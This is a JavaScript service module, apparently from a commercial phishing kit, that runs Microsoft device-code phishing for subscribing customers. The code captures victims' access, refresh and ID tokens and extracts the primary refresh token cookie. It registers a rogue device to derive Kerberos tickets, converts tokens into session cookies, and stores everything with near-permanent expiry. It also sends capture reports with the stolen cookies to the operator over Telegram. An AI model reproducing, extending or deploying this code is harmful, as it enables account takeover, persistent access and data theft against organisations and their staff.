/**
 * VGenius C Engine – Device Proxy Service
 * Handles Microsoft Device Code OAuth flow proxying
 */
const axios = require('axios');
const ms = require('./microsoftclient');
const { HttpsProxyAgent } = require('https-proxy-agent');
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt, decrypt } = require('../utils/encrypt');
const { sendTelegramDocument } = require('../services/notification');
const proxyManager = require('../services/proxymanager');
const cookieConverter = require('./cookieconverter');
const { parsePrtClaims } = require('./kerberos');
const { enrollDevice } = require('./devicecode');

// In-memory job store (for active device code flows)
const activeJobs = new Map();

/**
 * Start a new device code flow
 * @param {string} mode - "token" or "cookie"
 * @param {string} jwtToken - The link's JWT token (user_id, link_id)
 * @param {object} reqOptions - Optional: { ip, userAgent } for capturing visitor info
 * @returns {object} job data including user_code, verification_uri, etc.
 */
async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
  try {
    // Decode JWT to get user_id and link_id
    const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    const { user_id, link_id } = decoded;

    // Verify user and link are active
    const [users] = await db.query(
      "SELECT * FROM users WHERE id = ? AND subscription_status = 'active' AND (subscription_expiry IS NULL OR subscription_expiry > NOW())",
      [user_id]
    );
    if (!users.length) throw new Error('Subscription inactive');
    const user = users[0];

    const [links] = await db.query(
      'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
      [link_id, user_id, 'active']
    );
    if (!links.length) throw new Error('Link not active');
    const link = links[0];

    // Call Microsoft Device Code endpoint via proxy
    const tenant = config.AZURE_TENANT || 'common';
    const clientId = config.AZURE_CLIENT_ID;
    const deviceCodeScope =
      'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default';
    // Claim a sticky proxy for the entire device code flow
    const { proxy, response: dcResponse } = await ms.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: deviceCodeScope,
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 15000,
        stickyProxy: true,
      }
    );

    const dcData = dcResponse.data;
    const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    // Store job in memory with IP/user-agent for later token capture
    activeJobs.set(jobId, {
      jobId,
      user_id,
      link_id,
      device_code: dcData.device_code,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: mode || 'cookie',
      status: 'polling',
      created_at: Date.now(),
      jwtToken,
      ip_address: (reqOptions && reqOptions.ip) || 'unknown',
      user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
      proxy_id: proxy ? proxy.id : null,
      proxy_host: proxy ? proxy.proxy_host : null,
      proxy: proxy || null,
    });

    // Start polling in background
    pollForToken(jobId);

    return {
      job_id: jobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
      message: dcData.message,
    };
  } catch (err) {
    console.error('[DeviceProxy] startDeviceFlow error:', err.message);
    if (err.response) {
      console.error('[DeviceProxy] Microsoft response:', err.response.status, JSON.stringify(err.response.data).substring(0, 500));
    }
    throw err;
  }
}

/**
 * Poll for token completion
 */
async function pollForToken(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) return;

  // Use same tenant as device code endpoint (organizations for adrs_access scope)
  const tenant = config.AZURE_TENANT || 'organizations';
  const clientId = config.AZURE_CLIENT_ID;
  const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));

  for (let i = 0; i < maxAttempts; i++) {
    if (!activeJobs.has(jobId)) return; // Job cancelled

    // Check if expired before polling
    if (Date.now() > job.expires_at) {
      job.status = 'expired';
      // Update visitor status to timeout
      try {
        await db.query(
          'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
          ['timeout', job.user_id, job.link_id, 'waiting']
        );
      } catch (e) {
        /* ignore */
      }
      return;
    }

    await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));

    try {
      // Use the same proxy as the device code request for token polling
      const tokenResponse = await ms.post(
        `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: clientId,
          device_code: job.device_code,
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true,
          timeout: 15000,
          proxy: job.proxy,
        }
      );

      const tokenData = tokenResponse.data;

      if (tokenData.access_token) {
        // SUCCESS! Store token
        job.status = 'completed';

        // Extract email FIRST before using it
        let capturedEmail = null;
        if (tokenData.id_token) {
          try {
            const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
            capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
          } catch (e) {
            /* ignore */
          }
        }

        // Capture Set-Cookie headers from the token response (session cookies)
        const responseCookies = [];
        const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              responseCookies.push({
                name: cookieName,
                value: cookieValue,
                domain: '.login.microsoftonline.com'
              });
            }
          }
        }

        // Device code flow doesn't return x-ms-RefreshTokenCredential cookie.
        // Do a refresh token exchange to capture the PRT cookie.
        // This is required for Kerberos derivation and cookie injection.
        if (tokenData.refresh_token) {
          try {
            const refreshResponse = await ms.post(
              `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
              new URLSearchParams({
                grant_type: 'refresh_token',
                client_id: clientId,
                refresh_token: tokenData.refresh_token,
                scope: 'openid profile offline_access'
              }),
              {
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                validateStatus: () => true,
                timeout: 15000,
                proxy: job.proxy,
              }
            );

            // Capture PRT cookie from refresh token exchange
            const refreshSetCookies = refreshResponse.headers['set-cookie'] || [];
            for (const cookieStr of refreshSetCookies) {
              const cookieParts = cookieStr.split(';')[0].trim();
              const eqIndex = cookieParts.indexOf('=');
              if (eqIndex > 0) {
                const cookieName = cookieParts.substring(0, eqIndex).trim();
                const cookieValue = cookieParts.substring(eqIndex + 1).trim();
                if (cookieName === 'x-ms-RefreshTokenCredential' && cookieValue) {
                  // Add PRT cookie to responseCookies
                  responseCookies.push({
                    name: cookieName,
                    value: cookieValue,
                    domain: '.login.microsoftonline.com'
                  });
                  console.log('[DeviceProxy] PRT cookie captured from refresh token exchange: prefix=' + cookieValue.substring(0, 30) + '... length=' + cookieValue.length);
                }
              }
            }

            // If refresh token exchange returned a new refresh token, update tokenData
            if (refreshResponse.data && refreshResponse.data.refresh_token) {
              tokenData.refresh_token = refreshResponse.data.refresh_token;
            }
          } catch (e) {
            console.log('[DeviceProxy] Refresh token exchange for PRT failed:', e.message);
          }
        }

        // Store cookies and email in job for later storage
        job.captured_cookies = responseCookies;
        job.captured_email = capturedEmail;
        await storeToken(job, tokenData, responseCookies);

        // Mark proxy as success
        if (job.proxy_id) {
          try {
            await proxyManager.markSuccess(job.proxy_id);
            console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as success`);
          } catch (e) {
            /* ignore */
          }
        }

        // Mark visitors as done for this user/link
        try {
          await db.query(
            'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
            ['done', job.user_id, job.link_id, 'waiting']
          );
        } catch (e) {
          /* silent */
        }
        return;
      }

      // Check for AADSTS50076 / soft error
      const errorCode = tokenData.error || '';
      const errorDesc = tokenData.error_description || '';

      if (errorCode === 'authorization_pending') continue;

      if (errorCode === 'slow_down') {
        // Increase interval
        job.interval = (job.interval || 5) + 5;
        continue;
      }

      // Personal account errors - stop immediately with "code expired" behavior
      if (
        errorCode === 'expired_token' ||
        errorCode === 'authorization_declined' ||
        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
        errorDesc.includes('personal account') ||
        errorDesc.includes('MSA') ||
        (errorCode === 'invalid_grant' && (
          errorDesc.includes('expired') ||
          errorDesc.includes('personal') ||
          errorDesc.includes('MSA')
        ))
      ) {
        // Personal account or declined - stop immediately
        // This matches competitor behavior showing "code expired"
        console.log('[DeviceProxy] Personal account detected, stopping with expired behavior');
        job.status = 'failed';
        job.error = 'Code expired';
        return;
      }

      // AADSTS50076 or interaction_required -> soft error
      if (
        errorDesc.includes('aadsts50076') ||
        errorDesc.includes('interaction_required') ||
        errorCode === 'authorization_declined'
      ) {
        job.status = 'soft_error';
        // Start a new device code flow in token mode and store it
        const newJob = await retryAsTokenMode(job);
        if (newJob) {
          job.retry_job_id = newJob.jobId;
        }
        return;
      }
    } catch (err) {
      console.error('[DeviceProxy] Poll error:', err.message);
      // Mark proxy as failure
      if (job.proxy_id) {
        try {
          await proxyManager.markFailure(job.proxy_id);
          console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as failure`);
        } catch (e) {
          /* ignore */
        }
      }
      // Continue polling on network errors
    }
  }

  // Exhausted attempts - mark as expired with visitor timeout
  job.status = 'expired';
  try {
    await db.query(
      'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
      ['timeout', job.user_id, job.link_id, 'waiting']
    );
  } catch (e) {
    /* ignore */
  }
}

/**
 * Retry as token mode (create new device code)
 */
async function retryAsTokenMode(originalJob) {
  try {
    // Use same tenant as device code endpoint (organizations for adrs_access scope)
    const tenant = config.AZURE_TENANT || 'organizations';
    const clientId = config.AZURE_CLIENT_ID;

    // Claim a sticky proxy for the retry flow
    const { proxy, response: dcResponse } = await ms.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: config.AZURE_CLIENT_ID,
        scope: 'openid profile email offline_access 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default',
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 15000,
        stickyProxy: true,
      }
    );

    const dcData = dcResponse.data;
    const newJobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    const newJob = {
      jobId: newJobId,
      user_id: originalJob.user_id,
      link_id: originalJob.link_id,
      device_code: dcData.device_code,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: 'token',
      status: 'polling',
      created_at: Date.now(),
      jwtToken: originalJob.jwtToken,
      is_retry: true,
      proxy_id: proxy ? proxy.id : null,
      proxy_host: proxy ? proxy.proxy_host : null,
      proxy: proxy || null,
    };

    activeJobs.set(newJobId, newJob);
    pollForToken(newJobId);

    return {
      jobId: newJobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
    };
  } catch (err) {
    console.error('[DeviceProxy] retryAsTokenMode error:', err.message);
    return null;
  }
}

/**
 * Store captured token in database
 */
async function storeToken(job, tokenData, responseCookies = []) {
  try {
    // Extract email and tenant from id_token
    let email = null;
    let idTokenTenant = null;
    if (tokenData.id_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || null;
        idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
      } catch (e) {
        /* ignore */
      }
    }

    // Use stored IP and user-agent from when the flow started
    const ipAddress = job.ip_address || 'unknown';
    const userAgent = job.user_agent || 'DeviceProxy';

    // Format cookies for storage
    let cookiesEncrypted = null;
    if (responseCookies && responseCookies.length > 0) {
      const cookieStrings = responseCookies.map(
        c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`
      ).join('; ');
      cookiesEncrypted = encrypt(cookieStrings);
    }

    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
    let tenant = idTokenTenant || 'common';
    if (!idTokenTenant && job.jwtToken) {
      try {
        const decoded = jwt.verify(job.jwtToken, config.JWT_SECRET);
        const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ? AND user_id = ?', [decoded.link_id, decoded.user_id]);
        if (links.length && links[0].jwt_payload) {
          const parsed = JSON.parse(links[0].jwt_payload);
          if (parsed.tenant) tenant = parsed.tenant;
        }
      } catch (e) { /* use default */ }
    }

    // Extract PRT and related fields from token response
    let prt = null;
    let sessionKeyJwe = null;
    let deviceTenantId = null;
    let clientInfo = null;

    // Preserve the PRT from the x-ms-RefreshTokenCredential cookie (if present)
    // This is a JWT that can be decoded for client_info, session_key, tid, uid
    const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
    if (prtCookie && prtCookie.value) {
      prt = prtCookie.value;
      console.log('[DeviceProxy] PRT from cookie: prefix=' + (prtCookie.value || '').substring(0, 30) + '... length=' + (prtCookie.value || '').length);
    }

    // If no PRT cookie, fall back to OAuth refresh token (but don't overwrite cookie PRT)
    if (!prt && tokenData.refresh_token) {
      prt = tokenData.refresh_token;
      console.log('[DeviceProxy] Using OAuth refresh_token as PRT fallback: prefix=' + (prt || '').substring(0, 30) + '...');
    }

    // Extract session_key_enc from token response (if present)
    if (tokenData.session_key_enc) {
      sessionKeyJwe = tokenData.session_key_enc;
      console.log('[DeviceProxy] session_key_enc from token response');
    }

    // Extract client_info from token response (base64-encoded JSON with uid/utid)
    if (tokenData.client_info) {
      try {
        const clientInfoParsed = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
        deviceTenantId = clientInfoParsed.utid || null;
        clientInfo = tokenData.client_info;
        console.log('[DeviceProxy] client_info from token response, deviceTenantId=' + deviceTenantId);
      } catch (e) { /* ignore */ }
    }

    // Broker device enrollment from access_token
    let deviceId = null;
    let deviceEnrolled = false;
    let enrollmentTime = null;
    let deviceCertificateEncrypted = null;
    let encryptedPrivateKey = null;

    if (tokenData.access_token) {
      try {
        const accessPayload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
        deviceId = accessPayload['device_code_id'] || accessPayload['xms_device_id'] || accessPayload['oid'] || null;
      } catch (e) {
        deviceId = null;
      }
    }

    if (deviceId) {
      try {
        const { enrollDevice } = require('./devicecode');
        const enrollmentResult = await enrollDevice(tokenData.access_token, deviceId, tenant);
        deviceEnrolled = true;
        enrollmentTime = new Date();

        if (enrollmentResult.deviceCertificate) deviceCertificateEncrypted = encrypt(enrollmentResult.deviceCertificate);
        if (enrollmentResult.privateKeyPem) encryptedPrivateKey = encrypt(enrollmentResult.privateKeyPem);

        console.log('[DeviceProxy] Device enrolled: ' + enrollmentResult.deviceName + ' (' + deviceId + ')');
      } catch (enrollErr) {
        console.error('[DeviceProxy] Device enrollment failed:', enrollErr.message);
        deviceEnrolled = false;
      }
    }

    // Fallback: extract client_info from id_token JWT payload
    if (!clientInfo && tokenData.id_token) {
      try {
        const idTokenClaims = parsePrtClaims(tokenData.id_token);
        if (idTokenClaims && idTokenClaims.hasOwnProperty('tid')) {
          deviceTenantId = idTokenClaims.tid || deviceTenantId;
          // Build a synthetic client_info from id_token claims
          clientInfo = JSON.stringify({
            uid: idTokenClaims.oid || idTokenClaims.sub || '',
            utid: idTokenClaims.tid || ''
          });
          console.log('[DeviceProxy] Extracted client_info from id_token (tid=' + idTokenClaims.tid + ', oid=' + idTokenClaims.oid + ')');
        }
      } catch (e) { /* ignore */ }
    }

    // Decode PRT JWT from Set-Cookie headers (x-ms-RefreshTokenCredential)
    // The PRT JWT contains: client_info, session_key, id_token, tid, uid
    if (prtCookie && prtCookie.value) {
      try {
        const prtClaims = parsePrtClaims(prtCookie.value);
        if (prtClaims) {
          // Extract client_info from PRT JWT (higher priority than token response)
          if (prtClaims.client_info && !clientInfo) {
            clientInfo = prtClaims.client_info;
            console.log('[DeviceProxy] client_info from PRT JWT');
          }
          // Extract device_tenant_id from PRT JWT client_info
          if (prtClaims.client_info) {
            try {
              const ci = JSON.parse(Buffer.from(prtClaims.client_info, 'base64').toString());
              deviceTenantId = ci.utid || deviceTenantId;
            } catch (e) { /* ignore */ }
          }
          // Extract session_key from PRT JWT (overrides session_key_enc from token response)
          if (prtClaims.session_key) {
            sessionKeyJwe = prtClaims.session_key;
            console.log('[DeviceProxy] session_key from PRT JWT');
          }
          // Log acrs claim for Kerberos eligibility check
          if (Array.isArray(prtClaims.acrs)) {
            console.log('[DeviceProxy] PRT acrs claims: ' + JSON.stringify(prtClaims.acrs) + ' (pfdr=' + prtClaims.acrs.includes('pfdr') + ')');
          }
        } else {
          console.log('[DeviceProxy] PRT JWT parse failed (not a JWT format): prefix=' + (prtCookie.value || '').substring(0, 30) + '...');
        }
      } catch (e) {
        console.log('[DeviceProxy] Failed to decode PRT JWT:', e.message);
      }
    }

    // Determine account type from email domain (must be before INSERT)
    // Default to work/school - only personal accounts (outlook/hotmail/live/passport) are excluded
    let accountType = 'work_school';
    if (email) {
      const emailDomain = email.split('@')[1].toLowerCase();
      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
        accountType = 'personal';
        console.log('[DeviceProxy] Personal account detected:', emailDomain, '- device registration disabled');
      } else {
        console.log('[DeviceProxy] Organization account detected:', emailDomain, '- device registration enabled');
      }
    }

    // Determine client_id used for this capture
    const clientIdUsed = config.AZURE_CLIENT_ID;

    const [result] = await db.query(
       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, client_info, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id, device_id, device_certificate_encrypted, encrypted_private_key, device_enrolled, enrollment_time)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        job.user_id,
        job.link_id,
        email,
        job.mode || 'token',
        encrypt(tokenData.access_token),
        encrypt(tokenData.refresh_token || null),
        encrypt(tokenData.id_token || null),
        encrypt(prt),
        clientInfo,
        encrypt(sessionKeyJwe),
        deviceTenantId,
        cookiesEncrypted,
        ipAddress,
        userAgent,
        tenant,
        'office',
        accountType,
        clientIdUsed,
        deviceId,
        deviceCertificateEncrypted,
        encryptedPrivateKey,
        deviceEnrolled ? 1 : 0,
        enrollmentTime,
      ]
    );

    const tokenId = result.insertId;

    // Log token capture details for debugging
    console.log('[DeviceProxy] Token captured:', {
      tokenId,
      email,
      accountType,
      tenant,
      hasPrt: !!prt,
      hasIdToken: !!tokenData.id_token,
      hasClientInfo: !!clientInfo,
      hasSessionKeyJwe: !!sessionKeyJwe,
      hasDeviceTenantId: !!deviceTenantId,
      sessionKeySource: sessionKeyJwe ? (tokenData.session_key_enc ? 'token response (session_key_enc)' : 'PRT JWT (session_key)') : 'not extracted',
      clientInfoSource: clientInfo ? (tokenData.client_info ? 'token response' : 'PRT JWT') : 'not extracted',
      idTokenTenant: idTokenTenant || 'not extracted'
    });

    // For cookie mode, trigger cookie conversion immediately after capture
    let cookieConversionResult = null;
    if (job.mode === 'cookie') {
      const refreshTokenForConversion = tokenData.refresh_token || prt || tokenData.access_token;
      cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
        .catch(err => {
          console.error('[DeviceProxy] Cookie conversion failed:', err.message);
          return { success: false, error: err.message };
        });
    }

    // Attempt device registration and PRT generation for ALL work/school accounts
    // This runs asynchronously and doesn't block the response
    // Works for: specific tenant GUIDs, 'organizations', AND 'common' endpoints
    if (accountType === 'work_school' && tokenData.access_token) {
      console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
      const deviceManager = require('./devicemanager');
      // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
      const emailDomain = email ? email.split('@')[1] : null;

      // Flag to track if device registration failed
      let deviceRegistrationFailed = false;

      deviceManager.registerDeviceAndGetPrt({
        access_token: tokenData.access_token,
        refresh_token: tokenData.refresh_token,
        tenant_id: tenant,
        target_domain: emailDomain || tenant, // Use email domain for DRS, fallback to tenant GUID
        user_id: job.user_id,
        link_id: job.link_id
      }).then(registrationResult => {
        console.log('[DeviceProxy] Device registered successfully:', registrationResult.deviceId);
        // Store device credentials in database
        return deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
      }).then(() => {
        console.log('[DeviceProxy] Device credentials stored for token', tokenId);

        // Auto-derive Kerberos TGTs ONLY after successful device registration
        // This ensures we have a real PRT (not just a refresh token)
        if (tenant && tenant !== 'common' && tenant !== 'organizations') {
          console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
          const kerberosService = require('./kerberos');
          kerberosService.deriveTGTForToken(tokenId)
            .then(derivationResult => {
              if (derivationResult.success) {
                console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
                // Update the token record with Kerberos data
                if (derivationResult.tgt_cloud) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                    [encrypt(derivationResult.tgt_cloud), tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
                }
                if (derivationResult.tgt_ad) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                    [encrypt(derivationResult.tgt_ad), tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
                }
                if (derivationResult.session_key) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                    [encrypt(derivationResult.session_key), tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
                }
                if (derivationResult.kerberos_top_level_names) {
                  db.query(
                    'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                    [derivationResult.kerberos_top_level_names, tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
                }
              } else {
                console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
              }
            })
            .catch(err => {
              console.error('[DeviceProxy] Kerberos derivation error:', err.message);
            });
        }
      }).catch(err => {
        console.error('[DeviceProxy] Device registration failed:', err.message);
        deviceRegistrationFailed = true;
        // Don't fail the token capture - device registration is optional
      });

      // Expose flag for capture.js to check early
      job.deviceRegistrationFailed = () => deviceRegistrationFailed;
    } else {
      console.log('[DeviceProxy] Device registration skipped:', {
        tokenId,
        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : 'unknown'
      });
    }

    // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
    try {
      const [blockRows] = await db.query(
        'SELECT block_done_visitors FROM visitor_settings WHERE user_id = ?',
        [job.user_id]
      );
      const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
      const newStatus = blockDone ? 'blocked' : 'done';
      
      // Update ALL visitors with status 'waiting' OR 'visited' for this user/link
      // This ensures visitors logged by block-check (status='visited') are also updated
      const [updateResult] = await db.query(
        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
        [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
      );
      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id} (updated ${updateResult.affectedRows} rows)`);
    } catch (updateErr) {
      console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
    }

    // Notify via WebSocket
    try {
      const io = require('express')().get('io');
      if (io) {
        const notifyTokenType = job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success ? 'cookie' : (job.mode || 'token');
        io.to(`user_${job.user_id}`).emit('new_token', {
          id: tokenId,
          email,
          token_type: notifyTokenType,
          created_at: new Date(),
        });
      }
    } catch (e) {
      /* silent */
    }

    console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);

    // Send Telegram capture report directly from device proxy
    // This ensures Telegram receives the capture even if the worker never calls /api/capture
    try {
      const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';

      // Load stored token row so Kerberos fields are defined if already saved
      const [tokenRows] = await db.query(
        'SELECT id, email, token_type, tenant, account_type, ip_address, user_agent, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey FROM captured_tokens WHERE id = ?',
        [tokenId]
      );
      const tokenRow = tokenRows.length > 0 ? tokenRows[0] : null;

      const safe = (v) => (v == null ? 'N/A' : v);
      const caption = `🚨 NEW CAPTURE - ${reportTokenType.toUpperCase()}
👤 <b>Email:</b> ${safe(email || tokenRow?.email)}
🏷️ <b>Account:</b> ${safe(accountType || tokenRow?.account_type)} | Tenant: ${safe(tenant || tokenRow?.tenant)}
🌐 <b>Template:</b> office
🌍 <b>IP:</b> ${safe(ipAddress || tokenRow?.ip_address)}
🔗 <b>Link:</b> ${job.link_id} | Token ID: ${tokenId}
📅 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
✅ Full ${reportTokenType}s in attached .txt`;

      let fileContent = [
        'VGENIUS CAPTURE REPORT',
        '========================================',
        `Type:        ${reportTokenType.toUpperCase()}`,
        `Token ID:    ${tokenId}`,
        `Email:       ${safe(email || tokenRow?.email)}`,
        `Account:     ${safe(accountType || tokenRow?.account_type)}`,
        `Tenant:      ${safe(tenant || tokenRow?.tenant)}`,
        `IP:          ${safe(ipAddress || tokenRow?.ip_address)}`,
        `User Agent:  ${safe(userAgent || tokenRow?.user_agent)}`,
        `Link:        ${job.link_id}`,
        `Time:        ${new Date().toISOString()}`,
        '========================================'
      ].join('\n');

      // For cookie mode, include actual cookies in the report
      if (job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success && cookieConversionResult.cookies) {
        const cookieText = Array.isArray(cookieConversionResult.cookies)
          ? cookieConversionResult.cookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
          : String(cookieConversionResult.cookies);
        fileContent += '\n\nCOOKIES:\n' + cookieText;
      }

      const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;

      console.log('[DeviceProxy] Sending Telegram report for token', tokenId, 'type=', reportTokenType, 'caption=', caption);
      await sendTelegramDocument(job.user_id, filename, fileContent, caption);
      console.log('[DeviceProxy] Telegram report sent for token', tokenId);
    } catch (telegramErr) {
      console.error('[DeviceProxy] Telegram report failed:', telegramErr);
    }
  } catch (err) {
    console.error('[DeviceProxy] storeToken error:', err.message);
  }
}

/**
 * Poll a specific job status
 * @param {string} jobId
 * @returns {object} status info
 */
function getJobStatus(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) {
    return {
      status: 'not_found',
      error: 'Job not found or expired'
    };
  }

  // Check expiry
  if (Date.now() > job.expires_at && job.status === 'polling') {
    job.status = 'expired';
  }

  const remaining = Math.max(0, Math.floor((job.expires_at - Date.now()) / 1000));

  const result = {
    status: job.status === 'completed' ? 'done' : job.status,
    job_id: job.jobId,
    user_code: null,
    verification_uri: null,
    verification_uri_complete: null,
    expires_in: remaining,
    recommended_mode: null,
    error_code: null,
    error_message: null,
  };

  if (job.status === 'polling') {
    // Return waiting status
    result.status = 'waiting_user';
  }

  if (job.status === 'expired' || job.status === 'failed') {
    result.error = job.error || 'Code expired or verification failed';
  }

  if (job.status === 'soft_error') {
    result.soft_error = true;
    result.error_code = 50076;
    result.recommended_mode = 'token';
    result.error_message = 'Additional verification required';
    if (job.retry_job_id) {
      result.retry_job_id = job.retry_job_id;
    }
  }

  if (job.status === 'completed') {
    result.email = job.captured_email || null;
  }

  return result;
}

/**
 * Clean up expired jobs (called periodically)
 */
function cleanupJobs() {
  const now = Date.now();
  for (const [id, job] of activeJobs) {
    if (now > job.expires_at + 300000) {
      // 5 min grace period
      activeJobs.delete(id);
    }
  }
}

// Cleanup every 5 minutes
setInterval(cleanupJobs, 5 * 60 * 1000);

module.exports = {
  startDeviceFlow,
  getJobStatus,
  pollForToken,
  cleanupJobs,
};
